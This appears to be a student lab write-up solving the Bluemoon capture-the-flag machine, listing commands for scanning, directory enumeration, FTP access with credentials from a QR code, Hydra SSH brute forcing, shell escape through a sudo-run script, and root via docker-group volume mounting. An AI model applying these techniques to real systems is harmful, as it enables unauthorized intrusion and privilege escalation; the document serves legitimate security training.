# LabW2-Bluemoon


## Step 1: Find Kali's IP Address
Find your Kali's IP using the command:
```bash
ip a
```
<img width="650" height="370" alt="image" src="https://github.com/user-attachments/assets/829b2b9a-1745-4163-bef5-826971380392" />
Found Kali's IP: 192.168.56.101

## Step 2: Find Bluemoon's IP Address
Find Bluemoon's IP using the command:
```bash
sudo netdiscover -i eth0
```
<img width="652" height="225" alt="image" src="https://github.com/user-attachments/assets/834172c5-cd34-4715-88c8-0603b303dfbd" />
Found Bluemoon's IP: 192.168.56.102

Ping to check connectivity
```bash
ping 192.168.56.102
```
<img width="654" height="274" alt="image" src="https://github.com/user-attachments/assets/f81b734d-be54-46b9-9c1c-7675a6854f9c" />
Confirmed host is alive. CTRL + C to stop ping.

## Step 3: Run Nmap to scan Bluemoon
```bash
nmap -sC -sV 192.168.56.102
```
<img width="653" height="464" alt="image" src="https://github.com/user-attachments/assets/69d1c144-5501-4fce-b8ac-7661c3edcdf3" />
Found open ports: 21 FTP, 22 SSH, 80 HTTP

## Step 4: Visit the Website using Firefox
```bash
http://192.168.56.102
```
<img width="955" height="738" alt="image" src="https://github.com/user-attachments/assets/f4eea244-eed3-4653-b1a3-e677901f9c6c" />
You will see the Bluemoon page

## Step 5: Directory Enumeration
Use Gobuster
```bash
gobuster dir -u http://192.168.56.102 w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="647" height="553" alt="image" src="https://github.com/user-attachments/assets/e1c3ea6a-ec98-4b86-b411-c7fb5def4f30" />
Found /hidden_text

## Step 6: Find the QR Code
Visit Hidden Page in Firefox
```bash
http://192.168.56.102/hidden_text
```
<img width="959" height="406" alt="image" src="https://github.com/user-attachments/assets/51548272-daad-4b97-a79e-ae2b78c013c3" />
Press on the 'Thank You' link to find the QR Code
<img width="956" height="640" alt="image" src="https://github.com/user-attachments/assets/dfcef7ed-663b-441e-8607-de2b020514ef" />

## Step 7: Download the QR Code
```bash
wget http://192.168.56.102/.QR_C0d3.png
```
<img width="659" height="207" alt="image" src="https://github.com/user-attachments/assets/15fe1817-95ef-49cb-9dd5-b924c44e1996" />

## Step 8: Decode the QR
Install the QR tool using the command:
```bash
sudo apt install zbar-tools
```

## Step 9: Decode it 
Using the command: 
```bash
zbarimg .QR_C0d3.ong
```
<img width="656" height="234" alt="image" src="https://github.com/user-attachments/assets/92211b45-3418-4068-aea1-3e9b0341641c" />
You will get FTP credentials
USER=userftp
PASSWORD=ftpp@ssword

## Step 10: FTP Login
Connect to FTP with the recently acquired credentials using the command:
```bash
ftp 192.168.56.102
```
<img width="390" height="202" alt="image" src="https://github.com/user-attachments/assets/3dc9b684-c7ee-4fd8-85cf-4d6d3a28eb7d" />

## Step 11: List File
```bash
ls
```
<img width="585" height="112" alt="image" src="https://github.com/user-attachments/assets/0370dc2b-0f57-42ce-81b0-9b1ea6c639ff" />
You should see information.txt and p_lists.txt

## Step 12: Download Files
```bash
get information.txt
get p_lists.txt
```
<img width="651" height="247" alt="image" src="https://github.com/user-attachments/assets/9abe97b0-cdcd-44df-855b-0cce45af2c56" />
Then exit ftp with the command: bye

## Step 13: Read the Files
View the contents with the command:
```bash
cat information.txt
cat p_lists.txt
```
<img width="711" height="134" alt="image" src="https://github.com/user-attachments/assets/736713b3-6943-4de2-8c5c-a7495dcdf8c8" />
<img width="186" height="620" alt="image" src="https://github.com/user-attachments/assets/7eb51d90-f4f6-4386-ac89-d48e2aa48bf9" />
You will get the possible username: robin, and a password list

## Step 14: Brute Force SSH
Use Hydra with the command:
```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.102
```
<img width="715" height="388" alt="image" src="https://github.com/user-attachments/assets/4458cad0-e8b7-4698-a5c0-29ae1a6db60a" />
You will get
login: robin
password: k4rv3ndh4nh4ck3r

## Step 15: SSH Login
Connect to SSH with the recently acquired credentials using the command:
```bash
ssh robin@192.168.56.102
```
<img width="654" height="394" alt="image" src="https://github.com/user-attachments/assets/de1bd194-06e9-47b6-ac27-bde5a54be452" />

## Step 16: User Flag
Check files using
```bash
ls
```
<img width="182" height="38" alt="image" src="https://github.com/user-attachments/assets/67c75053-e031-4777-9906-74e591627fb0" />
You will see project   user1.txt

Read the flag using the command:
```bash
cat user1.txt
```
<img width="365" height="78" alt="image" src="https://github.com/user-attachments/assets/445f6863-94f9-40f7-8609-90f6dfb546fa" />
You will get the first flag: Fl4g{u5er1r34ch3d5ucc355fully}

## Step 17: Privilege Escalation to Jerry
Enter the project folder using the command:
```bash
cd project
ls
```
<img width="272" height="79" alt="image" src="https://github.com/user-attachments/assets/f7b81057-901b-4e57-af31-95d81a44cfb3" />
You will get 'feedback.sh'

## Step 18: Check Sudo Rights
Use the command:
```bash
sudo -l
```
<img width="656" height="130" alt="image" src="https://github.com/user-attachments/assets/a25de76b-ac9e-4d29-9aca-c6e45b7baeb5" />
You will notice: (robin) can run feedback.sh as jerry

## Step 19: Run Script
Using the command:
```bash
sudo -u jerry ./feedback.sh
```
<img width="721" height="165" alt="image" src="https://github.com/user-attachments/assets/20deb2a1-64f6-4dfd-bdf5-574df1d9ac34" />
Type in:
```bash
/bin/bash
```
<img width="715" height="197" alt="image" src="https://github.com/user-attachments/assets/29fa54b3-2b05-445a-89d3-3c1410596394" />

## Step 20: Get the Second Flag
Verify user using the command:
```bash
whoami
```
<img width="718" height="238" alt="image" src="https://github.com/user-attachments/assets/60729a27-e5e8-42f4-a304-3264ae25a78d" />

It will say: jerry

## Step 21: Enter Shell as Jerry
Use the command:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
<img width="720" height="306" alt="image" src="https://github.com/user-attachments/assets/6ffa50f7-60d7-468d-a0c2-fddd3b2846ae" />

## Step 22: Get the Second Flag
As jerry, use the command:
```bash
cd
ls -lha
```
<img width="333" height="58" alt="image" src="https://github.com/user-attachments/assets/892eb571-78e4-4b29-95df-068d68019238" />

## Step 23: Read the File
Use the command:
```bash
cat user2.txt
```
<img width="375" height="163" alt="image" src="https://github.com/user-attachments/assets/8265b55b-7c0d-436c-ada9-fb8162c47d1e" />
You will get the second flag: Fl4g{Y0ur34ch3du53r25uc355ful1y}

## Step 24: Root Privilege Escalation
Use the command: 
```bash
id
```
<img width="525" height="41" alt="image" src="https://github.com/user-attachments/assets/ddb9fd3f-dcde-4c4c-ad94-28d5a66d5e6a" />
You will notice docker

## Step 25: Abuse Docker Group
Use the command:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
<img width="566" height="33" alt="image" src="https://github.com/user-attachments/assets/87502b29-25d8-4783-a2b6-c8b1cae001dd" />
You will see #, which means you now have root access

## Step 26: Root Flag
Use the command: 
```bash
cd /root
ls
```
<img width="95" height="51" alt="image" src="https://github.com/user-attachments/assets/506108c9-14fe-484a-b553-356efc847162" />
You will find root.txt

## Step 27: Get Final Flag
Read the file with the command:
```bash
cat root.txt
```
<img width="306" height="365" alt="image" src="https://github.com/user-attachments/assets/b0f5f34e-1d4a-4c46-9e65-593688a2d010" />
You will get the final flag: Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
